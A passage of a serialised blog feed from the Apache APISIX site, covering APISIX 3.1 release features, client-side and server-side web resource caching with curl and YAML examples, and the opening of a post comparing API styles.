implementation. However, Consul KV is a bit different from Consul\'s own service discovery, which supports additional features such as health checks for registered services, so it is more widely used.\\n\\nIn this 3.1 release, another enthusiastic contributor has provided Consul-based service discovery to fill this gap.\\n\\nConsul-based service discovery has a similar configuration to Consul KV-based service discovery in previous versions. First, the service discovery needs to be enabled in the `config.yaml` file.\\n\\n```yaml\\ndiscovery:\\n  consul:\\n    servers:\\n      - \\"http://127.0.0.1:8500\\"\\n\\n```\\n\\nThen, configure the `service_name` and `discovery_type` in the specific upstream.\\n\\n```shell\\ncurl http://127.0.0.1:9180/apisix/admin/upstreams/1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -i -d \'\\n{\\n    \\"service_name\\": \\"service_a\\",\\n    \\"discovery_type\\": \\"consul\\"\\n}\'\\n```\\n\\nThe corresponding upstream is used to get the real upstream node based on the values configured in Consul.\\n\\n## New feature: built-in debugging plugins\\n\\nDebugging is a part of programmers\' daily work. As a gateway focusing on debugging experience, APISIX has a built-in Lua debugger plugin in the form of a plug-in in version 3.1, which supports dynamically setting breakpoints, adding callbacks, and so on.\\n\\nThe default configuration is as follows.\\n\\n```yaml\\nplugins:\\n    ...\\n    - inspect\\n    ...\\n\\nplugin_attr:\\n  inspect:\\n    delay: 3\\n    hooks_file: \\"/usr/local/apisix/plugin_inspect_hooks.lua\\"\\n```\\n\\nAPISIX periodically looks at the configured hooks_file (in this case is `/usr/local/apisix/plugin_inspect_hooks.lua` file) after startup. If there is the content inside the file, it sets breakpoints and callbacks based on the content inside. For example, the following will set a breakpoint on line 88 of `limit-req.lua` file and register the callback function `function(info) ... end`.\\n\\n```lua\\nlocal dbg = require \\"apisix.inspect.dbg\\"\\n\\ndbg.set_hook(\\"limit-req.lua\\", 88, require(\\"apisix.plugins.limit-req\\").access, function(info)\\n    ngx.log(ngx.INFO, debug.traceback(\\"foo traceback\\", 3))\\n    return true\\nend)\\n```\\n\\n## New features: optimizations and more small features\\n\\nIn addition to the big features mentioned above, this release contains several changes worth mentioning.\\n\\n- Optimization of resource usage for Prometheus metrics collection\\n- Support for configuring domain names as upstream in L4 proxies\\n\\nIf you are interested in the full update details of the new release, please refer to the [CHANGELOG](https://github.com/apache/apisix/blob/master/CHANGELOG.md#310) of the 3.1.0 release."},{"id":"Web resource caching: Server-Side","metadata":{"permalink":"/blog/2022/12/14/web-caching-server","source":"@site/blog/2022/12/14/web-caching-server.md","title":"Web resource caching: Server-Side","description":"The subject of Web resource caching is as old as the World Wide Web itself. However, I\'d like to offer an as-exhaustive-as-possible catalog of how one can improve performance by caching. Web resource caching can happen in two different places: client-side - on the browser and server side. In the previous post, I explained the former; this post focuses on the latter.","date":"2022-12-14T00:00:00.000Z","formattedDate":"December 14, 2022","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":3.985,"truncated":true,"authors":[{"name":"Nicolas Fr\xe4nkel","title":"Author","url":"https://github.com/nfrankel","image_url":"https://avatars.githubusercontent.com/u/752258","imageURL":"https://avatars.githubusercontent.com/u/752258"}],"prevItem":{"title":"Release Apache APISIX 3.1.0","permalink":"/blog/2022/12/30/release-apache-apisix-3.1.0"},"nextItem":{"title":"Web resource caching: Client-Side","permalink":"/blog/2022/12/07/web-caching-client"}},"content":">The subject of Web resource caching is as old as the World Wide Web itself. However, I\'d like to offer an as-exhaustive-as-possible catalog of how one can improve performance by caching. Web resource caching can happen in two different places: client-side - on the browser and server side. In the [previous post](https://blog.frankel.ch/web-caching/client/), I explained the former; this post focuses on the latter.\\n\\n\x3c!--truncate--\x3e\\n\\n<head>\\n    <link rel=\\"canonical\\" href=\\"https://blog.frankel.ch/web-caching/server/\\" />\\n</head>\\n\\nWhile client-side caching works well, it has one central issue: to serve the resource locally, it must first have it in the cache. Thus, each client needs its cached resource. If the requested resource is intensive to compute, it doesn\'t scale. The idea behind server-side caching is to compute the resource once and serve it from the cache to all clients.\\n\\n![Server-side cache principle](https://blog.frankel.ch/assets/generated/web-caching/server-cache.svg)\\n\\nA couple of dedicated server-side resource caching solutions have emerged over the years: [Memcached](https://memcached.org/), [Varnish](https://varnish-cache.org/), [Squid](http://www.squid-cache.org/), etc. Other solutions are less focused on web resource caching and more generic, _e.g._, [Redis](https://redis.io/) or [Hazelcast](https://hazelcast.com/).\\n\\nIf you want to dive deeper into generic caching solutions, please check these [two](https://blog.frankel.ch/choose-cache/1/) [posts](https://blog.frankel.ch/choose-cache/2/) on the subject.\\n\\nTo continue with the sample from last week, I\'ll use Apache APISIX to demo server-side caching. APISIX relies on the [proxy-cache](https://apisix.apache.org/docs/apisix/plugins/proxy-cache/) plugin for caching. Unfortunately, at the moment, APISIX doesn\'t integrate with any third-party caching solution. It offers two options: memory-based and disk-based.\\n\\nIn general, the former is faster, but memory is expensive, while the latter is slower, but disk storage is cheap. Within OpenResty, however, the disk option may be faster because of how LuaJIT handles memory. You should probably start with the disk, and if it\'s not fast enough, mount [/dev/shm](https://datacadamia.com/os/linux/shared_memory).\\n\\nHere are my new routes:\\n\\n```yaml\\nroutes:\\n  - uri: /cache\\n    upstream_id: 1\\n    plugins:\\n      proxy-rewrite:\\n        regex_uri: [\\"/cache(.*)\\", \\"/$1\\"]\\n      proxy-cache: ~\\n```\\n\\nNote that the default cache key is the host and the request URI, which includes query parameters.\\n\\nThe default `proxy-cache` configuration uses the default disk-based [configuration](https://github.com/apache/apisix/blob/master/conf/config-default.yaml#L53-L69):\\n\\n```yaml\\n  proxy_cache:                      # Proxy Caching configuration\\n    cache_ttl: 10s                  # The default caching time in disk if the upstream does not specify the cache time\\n    zones:                          # The parameters of a cache\\n      - name: disk_cache_one        # The name of the cache, administrator can specify\\n                                    # which cache to use by name in the admin api (disk|memory)\\n        memory_size: 50m            # The size of shared memory, it\'s used to store the cache index for\\n                                    # disk strategy, store cache content for memory strategy (disk|memory)\\n        disk_size: 1G               # The size of disk, it\'s used to store the cache data (disk)\\n        disk_path: /tmp/disk_cache_one  # The path to store the cache data (disk)\\n        cache_levels: 1:2           # The hierarchy levels of a cache (disk)\\n      - name: memory_cache\\n        memory_size: 50m\\n```\\n\\nWe can test the setup with `curl`:\\n\\n```bash\\ncurl -v localhost:9080/cache\\n```\\n\\nThe response is interesting:\\n\\n```\\n< HTTP/1.1 200 OK\\n< Content-Type: text/html; charset=utf-8\\n< Content-Length: 147\\n< Connection: keep-alive\\n< Date: Tue, 29 Nov 2022 13:17:00 GMT\\n< Last-Modified: Wed, 23 Nov 2022 13:58:55 GMT\\n< ETag: \\"637e271f-93\\"\\n< Server: APISIX/3.0.0\\n< Apisix-Cache-Status: MISS                      #1\\n< Accept-Ranges: bytes\\n```\\n\\n1. Because the cache is empty, APISIX has a cache miss. Hence, the response is from the upstream\\n\\nIf we `curl` again before the default cache expiration period (300 seconds), the response is from the cache:\\n\\n```\\n< HTTP/1.1 200 OK\\n...\\n< Apisix-Cache-Status: HIT\\n```\\n\\nAfter the expiration period, the response is from the upstream, but the header is explicit:\\n\\n```\\n< HTTP/1.1 200 OK\\n...\\n< Apisix-Cache-Status: EXPIRED\\n```\\n\\nNote that we can explicitly purge the entire cache by using the custom `PURGE` HTTP method:\\n\\n```bash\\ncurl localhost:9080/cache -X PURGE\\n```\\n\\nAfter purging the cache, the above cycle starts anew.\\n\\nNote that it\'s also possible to bypass the cache, _e.g._, for testing purposes. We can configure the plugin accordingly:\\n\\n```yaml\\nroutes:\\n  - uri: /cache*\\n    upstream_id: 1\\n      proxy-cache:\\n        cache_bypass: [\\"$arg_bypass\\"]       #1\\n```\\n\\n1. Bypass the cache if you send a `bypass` query parameter with a non-`0` value\\n\\n```bash\\ncurl -v localhost:9080/cache?bypass=please\\n```\\n\\nIt serves the resource from the upstream regardless of the cache status:\\n\\n```\\n< HTTP/1.1 200 OK\\n...\\n< Apisix-Cache-Status: BYPASS\\n```\\n\\nFor more details on all available configuration parameters, check the [proxy-cache](https://apisix.apache.org/docs/apisix/plugins/proxy-cache/) plugin.\\n\\n## Conclusion\\n\\nThis post was relatively straightforward. The most challenging issue with server-side caching is the configuration: what to cache, for how long, etc. Unfortunately, it depends significantly on your context, problems, and available resources. You probably need to apply <abbr title=\\"Plan Do Check Act\\">PDCA</abbr>: guesstimate a relevant configuration, apply it, measure the performance, and rinse and repeat until you find your sweet spot.\\n\\nI hope that with an understanding of both client-side and server-side caching, you\'ll be able to improve the performance of your applications.\\n\\nThe source code is available on [GitHub](https://github.com/ajavageek/web-caching).\\n\\n**To go further:**\\n\\n* [Cache API responses](https://apisix.apache.org/docs/apisix/tutorials/cache-api-responses/)\\n* [proxy-cache plugin](https://apisix.apache.org/docs/apisix/plugins/proxy-cache/)"},{"id":"Web resource caching: Client-Side","metadata":{"permalink":"/blog/2022/12/07/web-caching-client","source":"@site/blog/2022/12/07/web-caching-client.md","title":"Web resource caching: Client-Side","description":"The subject of Web resource caching is as old as the World Wide Web itself. However, I\'d like to offer an as-exhaustive-as-possible catalog of how one can improve performance by caching. Web resource caching can happen in two different places: client-side - on the browser and server-side. This post is dedicated to the former; the next post will focus on the latter.","date":"2022-12-07T00:00:00.000Z","formattedDate":"December 7, 2022","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":9.29,"truncated":true,"authors":[{"name":"Nicolas Fr\xe4nkel","title":"Author","url":"https://github.com/nfrankel","image_url":"https://avatars.githubusercontent.com/u/752258","imageURL":"https://avatars.githubusercontent.com/u/752258"}],"prevItem":{"title":"Web resource caching: Server-Side","permalink":"/blog/2022/12/14/web-caching-server"},"nextItem":{"title":"How to choose the right API Style and Technology","permalink":"/blog/2022/12/06/choose-the-right-api-style-technology"}},"content":">The subject of Web resource caching is as old as the World Wide Web itself. However, I\'d like to offer an as-exhaustive-as-possible catalog of how one can improve performance by caching. Web resource caching can happen in two different places: client-side - on the browser and server-side. This post is dedicated to the former; the next post will focus on the latter.\\n\\n\x3c!--truncate--\x3e\\n\\n<head>\\n    <link rel=\\"canonical\\" href=\\"https://blog.frankel.ch/web-caching/client/\\" />\\n</head>\\n\\n## Caching 101\\n\\nThe idea behind caching is simple: if a resource is a time- or resource-consuming to compute, do it once and store the result. When somebody requests the resource afterward, return the stored result instead of computing it a second time. It looks simple - and it is, but the devil is in the detail, as they say.\\n\\nThe problem is that a \\"computation\\" is not a mathematical one. In mathematics, the result of a computation is constant over time. On the Web, the resource you requested yesterday may be different if you request it today. Think about the weather forecast, for example. It all boils down to two related concepts: **freshness** and **staleness**.\\n\\n>A fresh response is one whose age has not yet exceeded its freshness lifetime. Conversely, a stale response is one where it has.\\n>\\n>A response\'s freshness lifetime is the length of time between its generation by the origin server and its expiration time. An explicit expiration time is the time at which the origin server intends that a stored response can no longer be used by a `Cache` without further validation, whereas a heuristic expiration time is assigned by a `Cache` when no explicit expiration time is available. A response\'s age is the time that has passed since it was generated by, or successfully validated with, the origin server.\\n>\\n>When a response is \\"fresh\\" in the cache, it can be used to satisfy subsequent requests without contacting the origin server, thereby improving efficiency.\\n>\\n>-- [RFC 7234 - 4.2. Freshness](https://www.rfc-editor.org/rfc/rfc7234#section-4.2)\\n\\n## Early Web resource caching\\n\\nRemember that the WWW was relatively simple at its beginning compared to nowadays. The client would send a request, and the server would return the requested resource. When the resource was a page, whether it was a static page or a server-rendered page was unimportant. Hence, early client-side caching was pretty \\"rustic\\".\\n\\nThe first specification of Web caching is defined in [RFC 7234](https://www.rfc-editor.org/rfc/rfc7234), _aka_ HTTP/1.1 Caching, in 2014. Note that it has been superseded by [RFC 9111](https://www.rfc-editor.org/rfc/rfc9111) since 2022.\\n\\nI won\'t talk here about the `Pragma` HTTP header since it\'s deprecated. The most straightforward cache management is through the `Expire` response header. When the server returns the resource, it specifies after which timestamp the cache is stale. The browser has two options when a cached resource is requested:\\n\\n* Either the current time is _before_ the expiry timestamp: the resource is considered fresh, and the browser serves it from the local cache\\n* Or it\'s _after_: the resource is considered stale, and the browser requires the resource from the server as it was not cached\\n\\nThe benefit of `Expire` is that it\'s a purely local decision. It doesn\'t need to send a request to the server. However, it has two main issues:\\n\\n* The decision to use the locally cached resource (or not) is based on heuristics. The resource may have changed server-side despite the `Expiry` value being in the future, so the browser serves an out-of-date resource. Conversely, the browser may send a request because the time has expired, but the resource hasn\'t changed.\\n* Moreover, `Expire` is pretty basic. A resource is either fresh or stale; either return it from the `Cache` or send the request again. We may want to have more control.\\n\\n## Cache-Control to the rescue\\n\\nThe `Cache-Control` header aims to address the following requirements:\\n\\n* Never cache a resource at all\\n* Validate if a resource should be served from the cache before serving it\\n* Can intermediate caches (proxies) cache the resource?\\n\\n`Cache-Control` is an HTTP header used on the request **and** the response. The header can contain different directives separated by commas. Exact directives vary depending on whether they\'re part of the request or the response.\\n\\nAll in all, `Cache-Control` is quite complex. It might be well the subject of a dedicated post; I won\'t paraphrase the [specification](https://www.rfc-editor.org/rfc/rfc9111#name-cache-control).\\n\\nHowever, here\'s a visual help on how to configure `Cache-Control` response headers.\\n\\n![Cache Control flow](https://blog.frankel.ch/assets/generated/web-caching/cache-control-flow.svg)\\n\\nThe [Cache Control](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control#use_cases) page of Mozilla Developer Network has some significant use cases of `Cache-Control`, complete with configuration.\\n\\nAs `Expire`, `Cache-Control` is also **local**: the browser serves the resource from its cache, if needed, without any request to the server.\\n\\n## Last-Modified and ETag\\n\\nTo avoid the risk of serving an out-of-date resource, the browser **must** send a request to the server. Enters the `Last-Modified` response header. `Last-Modified` works in conjunction with the `If-Modified-Since` _request_ header:\\n\\n>The `If-Modified-Since` request HTTP header makes the request conditional: the server sends back the requested resource, with a `200` status, only if it has been last modified after the given date. If the resource has not been modified since, the response is a `304` without any body; the `Last-Modified` response header of a previous request contains the date of last modification. Unlike `If-Unmodified-Since`, `If-Modified-Since` can only be used with a `GET` or `HEAD`.\\n>\\n>-- [If-Modified-Since](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/If-Modified-Since)\\n\\nLet\'s use a diagram to make clear how they interact:\\n\\n![Last-Modified sequence diagram](https://blog.frankel.ch/assets/generated/web-caching/last-modified-sequence.svg)\\n\\nNote: the `If-Unmodified-Since` has the opposite function for `POST` and other non-idempotent methods. It returns a `412 Precondition Failed` HTTP error to avoid overwriting resources that have changed.\\n\\nA resource\'s last modified timestamp correlates well with whether it has changed. It still needs improvement. For example, a batch job could update the resource with the same content but change the last modified timestamp.\\n\\nEtags are an alternative to timestamps to avoid the above issue. The server computes the hash of the served resource and sends the `ETag` header containing the value along with the resource. When a new request comes in with the `If-None-Match` containing the hash value, the server compares it with the current hash. If they match, it returns a `304` as above.\\n\\nIt has the slight overhead of computing the hash vs. just handing the timestamp, but it\'s nowadays considered a good practice.\\n\\n## The Cache API\\n\\nThe most recent way to cache on the client side is via the [Cache API](https://developer.mozilla.org/en-US/docs/Web/API/Cache). It offers a general cache interface: you can think of it as a local key-value provided by the browser.\\n\\nHere are the provided methods:\\n\\n<table>\\n<tbody>\\n  <tr>\\n    <td><code>Cache.match(request, options)</code></td>\\n    <td>Returns a <code>Promise</code> that resolves to the response associated with the first matching request in the <code>Cache</code> object.</td>\\n  </tr>\\n  <tr>\\n    <td><code>Cache.matchAll(request, options)</code></td>\\n    <td>Returns a <code>Promise</code> that resolves to an array of all matching responses in the <code>Cache</code> object.</td>\\n  </tr>\\n  <tr>\\n    <td><code>Cache.add(request)</code></td>\\n    <td>Takes a URL, retrieves it and adds the resulting response object to the given cache. This is functionally equivalent to calling <code>fetch()</code>, then using <code>put()</code> to add the results to the cache.</td>\\n  </tr>\\n  <tr>\\n    <td><code>Cache.addAll(requests)</code></td>\\n    <td>Takes an array of URLs, retrieves them, and adds the resulting response objects to the given cache.</td>\\n  </tr>\\n  <tr>\\n    <td><code>Cache.put(request, response)</code></td>\\n    <td>Takes both a request and its response and adds it to the given cache.</td>\\n  </tr>\\n  <tr>\\n    <td><code>Cache.delete(request, options)</code></td>\\n    <td>Finds the <code>Cache</code> entry whose key is the request, returning a <code>Promise</code> that resolves to <code>true</code> if a matching <code>Cache</code> entry is found and deleted. If no <code>Cache</code> entry is found, the <code>Promise</code> resolves to <code>false</code>.</td>\\n  </tr>\\n  <tr>\\n    <td><code>Cache.keys(request, options)</code></td>\\n    <td>Returns a <code>Promise</code> that resolves to an array of <code>Cache</code> keys.</td>\\n  </tr>\\n</tbody>\\n</table>\\n\\nThe Cache API works in conjunction with [Service Workers](https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API/Using_Service_Workers). The flow is simple:\\n\\n1. You register a service worker on a URL\\n2. The browser calls the worker before the URL fetch call\\n3. From the worker, you can return resources from the cache and avoid **any** request to the server\\n\\nIt allows us to put resources in the cache after the initial load so that the client can work offline - depending on the use case.\\n\\n## Summary\\n\\nHere\'s a summary of the above alternatives to cache resources client-side.\\n\\n<table>\\n<thead>\\n  <tr>\\n    <th>Order</th>\\n    <th>Alternative</th>\\n    <th>Managed by</th>\\n    <th>Local</th>\\n    <th>Pros</th>\\n    <th>Cons</th>\\n  </tr>\\n</thead>\\n<tbody>\\n  <tr>\\n    <td>1</td>\\n    <td>Service worker + Cache API</td>\\n    <td>You</td>\\n    <td>Yes</td>\\n    <td>Flexible</td>\\n    <td>\\n      <ul>\\n        <li>Requires JavaScript coding skills</li>\\n        <li>Coding and maintenance time</li>\\n      </ul>\\n    </td>\\n  </tr>\\n  <tr>\\n    <td rowspan=\\"2\\">2</td>\\n    <td><code>Expire</code></td>\\n    <td>Browser</td>\\n    <td>Yes</td>\\n    <td>Easy configuration</td>\\n    <td>\\n      <ul>\\n        <li>Guess-based</li>\\n        <li>Simplistic</li>\\n      </ul>\\n    </td>\\n  </tr>\\n  <tr>\\n    <td><code>Cache-Control</code></td>\\n    <td>Browser</td>\\n    <td>Yes</td>\\n    <td>Fine-grained control</td>\\n    <td>\\n      <ul>\\n        <li>Guess-based</li>\\n        <li>Complex configuration</li>\\n      </ul>\\n    </td>\\n  </tr>\\n  <tr>\\n    <td rowspan=\\"2\\">3</td>\\n    <td><code>Last-Modified</code></td>\\n    <td>Browser</td>\\n    <td>No</td>\\n    <td>Just works</td>\\n    <td>Mishandle unchanged resources with a different timestamp</td>\\n  </tr>\\n  <tr>\\n    <td><code>ETag</code></td>\\n    <td>Browser</td>\\n    <td>No</td>\\n    <td>Just works</td>\\n    <td>Slightly more resource-sensitive to compute the hash</td>\\n  </tr>\\n</tbody>\\n</table>\\n\\nNote that those alternatives aren\'t exclusive. You may have a short `Expire` header and rely on `ETag`. You should probably use both a level 2 alternative and a level 3.\\n\\n## A bit of practice\\n\\nLet\'s put the theory that we have seen above into practice. I\'ll set up a two-tiered HTTP cache:\\n\\n* The first tier caches resources locally for 10 seconds using `Cache-Control`\\n* The second tier uses `ETag` to avoid optimizing the data load over the network\\n\\nI\'ll use [Apache APISIX](https://apisix.apache.org/). APISIX sits on the shoulder of giants, namely NGINX. NGINX adds `ETag` response headers _by default_.\\n\\nWe only need to add the `Cache-Control` response header.\\nWe achieve it with the `response-rewrite` plugin:\\n\\n```yaml\\nupstreams:\\n  - id: 1\\n    type: roundrobin\\n    nodes:\\n      \\"content:8080\\": 1\\nroutes:\\n  - uri: /*\\n    upstream_id: 1\\n    plugins:\\n      response-rewrite:\\n        headers:\\n          set:\\n            Cache-Control: \\"max-age=10\\"\\n```\\n\\nLet\'s do it _without a browser_ first.\\n\\n```bash\\ncurl -v localhost:9080\\n```\\n\\n```\\nHTTP/1.1 200 OK\\nContent-Type: text/html; charset=utf-8\\nContent-Length: 147\\nConnection: keep-alive\\nDate: Thu, 24 Nov 2022 08:21:36 GMT\\nAccept-Ranges: bytes\\nLast-Modified: Wed, 23 Nov 2022 13:58:55 GMT\\nETag: \\"637e271f-93\\"\\nServer: APISIX/3.0.0\\nCache-Control: max-age=10\\n```\\n\\nTo prevent the server from sending the same resource, we can use the `ETag` value in an `If-None-Match` request header:\\n\\n```bash\\ncurl -H \'If-None-Match: \\"637e271f-93\\"\' -v localhost:9080\\n```\\n\\nThe result is a `304 Not Modified` as expected:\\n\\n```\\nHTTP/1.1 304 Not Modified\\nContent-Type: text/html; charset=utf-8\\nContent-Length: 147\\nConnection: keep-alive\\nDate: Thu, 24 Nov 2022 08:26:17 GMT\\nAccept-Ranges: bytes\\nLast-Modified: Wed, 23 Nov 2022 13:58:55 GMT\\nETag: \\"637e271f-93\\"\\nServer: APISIX/3.0.0\\nCache-Control: max-age=10\\n```\\n\\nNow, we can do the same inside a browser. If we use the _resend_  feature a second time before 10 seconds have passed, the browser returns the resource from the cache without sending the request to the server.\\n\\n## Conclusion\\n\\nIn this post, I described several alternatives to cache web resources: `Expiry` and `Cache-Control`, `Last-Modified` and `ETag`, and the Cache API and web workers.\\n\\nYou can easily set the HTTP response headers via a reverse proxy or an API Gateway. With Apache APISIX, ETags are enabled by default, and other headers are easily set up.\\n\\nIn the next post, I will describe caching server-side.\\n\\nYou can find the source code for this post on [GitHub](https://github.com/ajavageek/web-caching).\\n\\n**To go further:**\\n\\n* [RFC 7234: HTTP/1.1: Caching (obsolete)](https://www.rfc-editor.org/rfc/rfc7234)\\n* [RFC 9111: HTTP Caching](https://www.rfc-editor.org/rfc/rfc9111)\\n* [HTTP caching](https://developer.mozilla.org/en-US/docs/Web/HTTP/Caching)\\n* [Cache-Control](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control)\\n* [Prevent unnecessary network requests with the HTTP Cache](https://web.dev/http-cache/)\\n* [Cache API](https://developer.mozilla.org/en-US/docs/Web/API/Cache)\\n* [Service worker caching and HTTP caching](https://web.dev/service-worker-caching-and-http-caching/)"},{"id":"How to choose the right API Style and Technology","metadata":{"permalink":"/blog/2022/12/06/choose-the-right-api-style-technology","source":"@site/blog/2022/12/06/choose-the-right-api-style-technology.md","title":"How to choose the right API Style and Technology","description":"How to decide on the right API style and which technology to choose for a style.","date":"2022-12-06T00:00:00.000Z","formattedDate":"December 6, 2022","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":10.86,"truncated":true,"authors":[{"name":"Bobur Umurzokov","title":"Author","url":"https://github.com/Boburmirzo","image_url":"https://avatars.githubusercontent.com/u/14247607","imageURL":"https://avatars.githubusercontent.com/u/14247607"}],"prevItem":{"title":"Web resource caching: Client-Side","permalink":"/blog/2022/12/07/web-caching-client"},"nextItem":{"title":"A poor man\'s API","permalink":"/blog/2022/11/23/poor-man-api"}},"content":"> In this post, we\u2019ll go through **the 5 most popular API styles** and look at very common questions like \u201c_How to decide on the right API style and which technology to choose for a style_\u201d and provide practical scenarios where an [API Gateway](https://apisix.apache.org/docs/apisix/terminology/api-gateway/) can supplement their weaknesses.\\n\\n\x3c!--truncate--\x3e\\n\\n<head>\\n    <link rel=\\"canonical\\" href=\\"https://iambobur.com/2022/12/06/how-to-choose-the-right-api-style-and-technology/\\" />\\n</head>\\n\\n## No best API style\\n\\n[API](https://en.wikipedia.org/wiki/API)s are an essential design element in any software architecture that interconnects components digitally and allows various systems and devices to communicate easily with each other.  When we built a new API, initially we think about the API design, and how the API interacts with the external world by using which **style and technology**.\\n\\nNote that there is no single best way of approaching all problems in a software design. The same is true with API styles. There is no \u201c_best_\u201d API style. They all have strengths and weaknesses that depend on the problem that is being addressed.\\n\\nLet\u2019s go through each style and understand the main properties, interaction model, and limitations.\\n\\n1. Resource.\\n2. Hypermedia.\\n3. Query.\\n4. Tunnel.\\n5. Event-Based.\\n\\nThen we pick a suitable style and technology that works well for the given style.\\n\\n## Resource style\\n\\nThe **resource style** as the name implies is _resource-oriented_. Many of today\u2019s APIs use the resource style, and this can be easily verified by the popularity of [OpenAPI](https://www.openapis.org/), which is the most popular way of describing resource-oriented APIs. In this style, the main focus is on which resources to expose to consumers so that they can interact with these resources.\\n\\n![Resource API style](https://static.apiseven.com/2022/12/06/638e3095ee0e7.png)\\n\\nThe resource in this context can be assumed to be similar in scope to what you would have in resources such as web pages when designing a website. The idea of resources gives us a great way to expose the relevant aspects of an API\u2019s functionality and at the same time allows us to hide implementation details behind the resources. There can be resources for persistent concepts such as products, product categories, and customer information. Also, there can be resources for process-oriented concepts such as ordering products or selecting a shipping option.\\n\\nFor the resource style, there is [REST](https://en.wikipedia.org/wiki/Representational_state_transfer) as an architectural pattern, but that doesn\u2019t mean that REST gives you concrete technologies. For REST, choosing [HTTP](https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol) as a protocol is a preferred choice, and for the representation format, it\u2019s probably safe to say that [JSON](https://www.json.org/json-en.html) by far overshadows any other representation (such as the [XML](https://en.wikipedia.org/wiki/XML) that was popular before JSON). When a client request is made through a RESTful API, it transfers a representation of the state of the resource to the endpoint.\\n\\nIn developing REST APIs with many collections of resources that are integrated with backend HTTP endpoints, you can use [API Gateway features](https://apisix.apache.org/docs/apisix/getting-started/) to help you with all aspects of the API lifecycle, from creation to monitoring your production APIs. API Gateway REST APIs use a request/response model where a client sends a request to a service and the service responds back synchronously. You can read more about [how to choose the right API Gateway](https://iambobur.com/2022/11/22/how-to-choose-the-right-api-gateway/) for your REST APIs.\\n\\nResource style lacks is the ability to better represent workflows across these resources. The **hypermedia style** adds a key component to the resource style to address resource-linking concerns.\\n\\n## Hypermedia Style\\n\\nJust as on the web, the most important paths across resources can be navigated by simply _using links_ between them (instead of having to know each resource individually and enter its URI in the browser\u2019s address bar); the [hypermedia style](https://www.infoq.com/articles/hypermedia-api-tutorial-part-one/) does the same but for the resources of an API.\\n\\n![Hypermedia API Style](https://static.apiseven.com/2022/12/06/638e3097625fa.png)\\n\\nOn the web, humans read pages and then decide which link to follow. For hypermedia APIs, this decision is usually made by a machine. This means that links need to have machine-readable labels so that machines can identify the available options and then make a choice. These labels are conceptually similar to the text of a link that humans click on web pages, but the labels are represented in the machine-readable representation of resources, which nowadays in many cases will be JSON.  In a hypermedia API, where you can \u201c_navigate_\u201d across resources using the links between them. Resource style sometimes requires [HATEOAS](https://api-university.com/blog/rest-apis-with-hateoas/).\\n\\n> _HATEOAS_ is an abbreviation for Hypermedia As The Engine Of Application State. HATEOAS is the aspect of REST, which allows for dynamic resource routing.\\n\\nThere are two main advantages of **hypermedia APIs over resource-style APIs**:\\n\\n- They provide all the links necessary in the previous response to choose the available resources in the next step.\\n- Links span resources, and it doesn\u2019t matter whether these resources are provided by one API or several APIs.\\n\\nAll of this sounds very positive because the Hypermedia style provides the necessary knowledge for API consumers to discover your API themselves and what resources you offer to them. You can build a hypermedia-driven REST service with any programming language and framework used in your stack. For example, using [ASP.NET Web API](https://learn.microsoft.com/en-us/archive/msdn-magazine/2013/january/asp-net-building-hypermedia-web-apis-with-asp-net-web-api) or [Spring Boot Rest API](https://spring.io/guides/gs/rest-hateoas/).\\n\\nHowever, the ease of browsing may increase the risk of the learner skipping through the materials and getting fragmented information. Also, since data is shared between client and server, it can also lead to \u201c_chatty_\u201d APIs that require a number of interactions for the client to access all required information, and what if API endpoints are exposed by multiple backend services (microservices and serverless APIs)?. The latter challenge can be solved by leveraging an API Gateway with _a response aggregator/composer_ functionality.\\n\\nMoreover, API consumers do not know what they want from the very beginning and it is more efficient to write a query to get exactly what they want as is offered by the **query style** in the next section.\\n\\n## Query Style\\n\\nThe _query style_ is rather different from the resource and hypermedia styles because it provides _a single entry point_ to access a potentially large set of resources. The idea of the query style is that these resources are managed in a structured form by the API provider. This structure can be queried, and the response contains the query results. At some level, this can be seen as similar to how databases work. They have an underlying data model for the data they store, and a query language that can be used to select and retrieve parts of that data.\\n\\n![Query API Style](https://static.apiseven.com/2022/12/06/638e309758164.png)\\n\\nOne benefit of the query style is that each consumer can request exactly what they want. This means that with a well-constructed query, it may be possible to combine results that would have required numerous requests in resource/hypermedia APIs. For example, instead of sending several HTTP requests to different endpoints, you can `POST` a single \u201c_query_\u201d for all you need.\\n\\nFor the query style, it\u2019s probably fair to say that [GraphQL](https://graphql.org/) by now is by far the most popular choice when it comes to building [single-page applications](https://en.wikipedia.org/wiki/Single-page_application) (SPAs). It is a language for querying databases from client-side applications. The big advantage that GraphQL has is that it plugs into a JSON-based ecosystem. While GraphQL does not use JSON for queries, it returns results in JSON which make it easy to process in JSON-focused environments.\\n\\nAlthough query style has negligible disadvantages over its advantages, we can identify one of them is the query complexity. API consumers need to have a good understanding of the underlying data and query models (so that they know how to use the query API properly and make efficient requests to avoid recursion or getting too many nested resources). Also, it is more complicated to implement a simplified cache with GraphQL than implement it in resource style because REST APIs have multiple endpoints, they can leverage native HTTP caching to avoid re-fetching resources.  Another problem with GraphQL is rate-limiting where you say we allow only this amount of requests.\\n\\nNevertheless, the last two mentioned downsides (caching and rate-limiting) can be developed by introducing the API Gateway between the client and data store to win in this situation. For example, an open-source  [Apache APISIX](https://apisix.apache.org/) API Gateway has the matching ability to recognize GraphQL syntax. By efficiently matching GraphQL statements carried in requests, it can filter out abnormal traffic to further apply [rate-limiting policies](https://apisix.apache.org/docs/apisix/tutorials/protect-api/) and improve system performance with its [caching capability](https://apisix.apache.org/docs/apisix/tutorials/cache-api-responses/).\\n\\n## Tunnel Style\\n\\nIn _tunnel style_, an API is a collection of functions that can be invoked remotely. APIs become a simple extension of what is in a local programming scenario where all exposed procedures are available as APIs. The tunnel style is convenient for developers because it can take very little effort to create APIs.\\n\\n![Tunnel API Style](https://static.apiseven.com/2022/12/06/638e3095e2fe3.png)\\n\\nA common technique used in this style is the [Remote Procedure Call](https://en.wikipedia.org/wiki/Remote_procedure_call) method.  RPC is a request-response protocol, where a client sends a request to a remote server to execute a specific procedure, and then the client receives a response back. However, RPC APIs are much more difficult to maintain and update than REST APIs, so again RPC APIs aren\u2019t used as much in modern API development.\\n\\n[gRPC](https://grpc.io/) is an efficient 